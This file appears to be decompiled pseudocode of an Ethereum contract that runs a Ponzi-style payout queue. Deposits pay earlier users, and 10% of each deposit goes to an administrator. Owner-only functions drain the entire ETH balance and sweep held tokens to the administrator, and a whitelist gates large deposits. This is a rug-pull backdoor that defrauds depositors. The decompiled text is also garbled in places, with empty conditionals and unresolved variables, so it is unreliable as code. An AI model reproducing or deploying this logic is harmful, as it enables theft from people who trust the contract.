contract main {




// =====================  Runtime code  =====================


address owner;
address administratorAddress;
uint256 sub_511b5f61;
mapping of uint8 stor3;
array of struct users;
uint256 currentlyPaying;
uint256 totalUsers;
uint256 totalWei;
uint256 totalPayout;
uint8 active;
array of uint256 stor62514009886607029107290561805838585334079798074568712924583230797734656856476;

function active() {
    return bool(active)
}

function users(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 < users.length
    return users[arg1].field_0, users[arg1].field_256
}

function totalPayout() {
    return totalPayout
}

function currentlyPaying() {
    return currentlyPaying
}

function sub_511b5f61(?) {
    return sub_511b5f61
}

function totalWei() {
    return totalWei
}

function owner() {
    return owner
}

function totalUsers() {
    return totalUsers
}

function administrator() {
    return administratorAddress
}

function sub_87817ce0(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Cannot call function unless owner'
    sub_511b5f61 = arg1
}

function setIsTxLimitExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Cannot call function unless owner'
    stor3[address(arg1)] = uint8(arg2)
}

function sub_dd751460(?) {
    if owner != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Cannot call function unless owner'
    if bool(active) != 1:
        revert with 0, 'Contract must be active'
    if eth.balance(this.address) <= 0:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'This contract must have a balance above zero'
    call administratorAddress with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    active = 0
}

function sub_dc7a70ca(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Cannot call function unless owner'
    staticcall address(arg1).0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] < arg2:
        revert with 0, 'No tokens'
    call address(arg1).approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args this.address, -1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    call address(arg1).0xa9059cbb with:
         gas gas_remaining wei
        args administratorAddress, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
    return 1
}

function _fallback() payable {
    if calldata.size >= 4:
        if unknown_0x87817ce0(?????) > uint32(call.func_hash) >> 224:
            if unknown_0x4941b9e1(?????) <= uint32(call.func_hash) >> 224:
                if unknown_0x4941b9e1(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return currentlyPaying
                if unknown_0x511b5f61(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return sub_511b5f61
                require unknown_0x6d98e9fc(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                return totalWei
            if active() == uint32(call.func_hash) >> 224:
                require not msg.value
                return bool(active)
            if uint32(call.func_hash) >> 224 != unknown_0x365b98b2(?????):
                require unknown_0x454f7b8f(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                return totalPayout
            require not msg.value
            require calldata.size - 4 >= 32
            require arg1 < users.length
            return users[arg1].field_0, users[arg1].field_256
        if unknown_0xdc7a70ca(?????) > uint32(call.func_hash) >> 224:
            if uint32(call.func_hash) >> 224 != unknown_0x87817ce0(?????):
                if unknown_0x8da5cb5b(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return owner
                require unknown_0xbff1f9e1(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                return totalUsers
            require not msg.value
            require calldata.size - 4 >= 32
            if owner != msg.sender:
                revert with 0, 'Cannot call function unless owner'
            sub_511b5f61 = arg1
        if uint32(call.func_hash) >> 224 != unknown_0xdc7a70ca(?????):
            if unknown_0xdd751460(?????) == uint32(call.func_hash) >> 224:
                require not msg.value
                if owner != msg.sender:
                    revert with 0, 'Cannot call function unless owner'
                if bool(active) != 1:
                    revert with 0, 'Contract must be active'
                if eth.balance(this.address) <= 0:
                    revert with 0, 'This contract must have a balance above zero'
                call administratorAddress with:
                   value eth.balance(this.address) wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                active = 0
            else:
                if unknown_0xf53d0a8e(?????) == uint32(call.func_hash) >> 224:
                    require not msg.value
                    return administratorAddress
                require unknown_0xf84ba65d(?????) == uint32(call.func_hash) >> 224
                require not msg.value
                require calldata.size - 4 >= 64
                require arg1 == address(arg1)
                require arg2 == bool(arg2)
                if owner != msg.sender:
                    revert with 0, 'Cannot call function unless owner'
                stor3[address(arg1)] = uint8(bool(arg2))
        require not msg.value
        require calldata.size - 4 >= 64
        require arg1 == address(arg1)
        if owner != msg.sender:
            revert with 0, 'Cannot call function unless owner'
        staticcall address(arg1).0x70a08231 with:
                gas gas_remaining wei
               args this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        if ext_call.return_data[0] < arg2:
            revert with 0, 'No tokens'
        call address(arg1).approve(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args this.address, -1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
        call address(arg1).0xa9059cbb with:
             gas gas_remaining wei
            args administratorAddress, arg2
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == bool(ext_call.return_data[0])
        return 1
    require not calldata.size
    if msg.value <= sub_511b5f61:
        users.length++
        users[users.length].field_0 = tx.origin
        stor8A35[stor4.length] = msg.value
        if totalUsers > -2:
            revert with 'NH{q', 17
        totalUsers++
        if totalWei > !msg.value:
            revert with 'NH{q', 17
        totalWei += msg.value
        call administratorAddress with:
           value msg.value / 10 wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        if currentlyPaying >= users.length:
            revert with 'NH{q', 50
        if var44002:
            if var54001 and 2 > -1 / var54001:
                revert with 'NH{q', 17
            if not var60002:
                revert with 'NH{q', 18
            require var64001 == 2
            if eth.balance(this.address) <= var62001:
            if currentlyPaying >= users.length:
                revert with 'NH{q', 50
            if var68002:
                if var78001 and 2 > -1 / var78001:
                    revert with 'NH{q', 17
                # nil
            else:
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var81003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                # nil
        else:
            if eth.balance(this.address) <= var55001:
            if currentlyPaying >= users.length:
                revert with 'NH{q', 50
            if var61002:
                if var71001 and 2 > -1 / var71001:
                    revert with 'NH{q', 17
                if not var77002:
                    revert with 'NH{q', 18
                require var81001 == 2
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var81003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                # nil
            else:
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var74003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                if totalPayout > !var78002:
                    revert with 'NH{q', 17
                totalPayout = var82001
                if currentlyPaying > -2:
                    revert with 'NH{q', 17
                currentlyPaying++
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                # nil
    else:
        if not stor3[tx.origin]:
            revert with 0, 'Tx Limit Exceeded'
        users.length++
        users[users.length].field_0 = tx.origin
        stor8A35[stor4.length] = msg.value
        if totalUsers > -2:
            revert with 'NH{q', 17
        totalUsers++
        if totalWei > !msg.value:
            revert with 'NH{q', 17
        totalWei += msg.value
        call administratorAddress with:
           value msg.value / 10 wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        if currentlyPaying >= users.length:
            revert with 'NH{q', 50
        if var45002:
            if var55001 and 2 > -1 / var55001:
                revert with 'NH{q', 17
            if not var61002:
                revert with 'NH{q', 18
            require var65001 == 2
            if eth.balance(this.address) <= var63001:
            if currentlyPaying >= users.length:
                revert with 'NH{q', 50
            if var69002:
                if var79001 and 2 > -1 / var79001:
                    revert with 'NH{q', 17
                # nil
            else:
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var82003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                # nil
        else:
            if eth.balance(this.address) <= var56001:
            if currentlyPaying >= users.length:
                revert with 'NH{q', 50
            if var62002:
                if var72001 and 2 > -1 / var72001:
                    revert with 'NH{q', 17
                if not var78002:
                    revert with 'NH{q', 18
                require var82001 == 2
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var82003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                # nil
            else:
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                call users[stor5].field_0 with:
                   value var75003 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                if totalPayout > !var79002:
                    revert with 'NH{q', 17
                totalPayout = var83001
                if currentlyPaying > -2:
                    revert with 'NH{q', 17
                currentlyPaying++
                if currentlyPaying >= users.length:
                    revert with 'NH{q', 50
                # nil
}



}
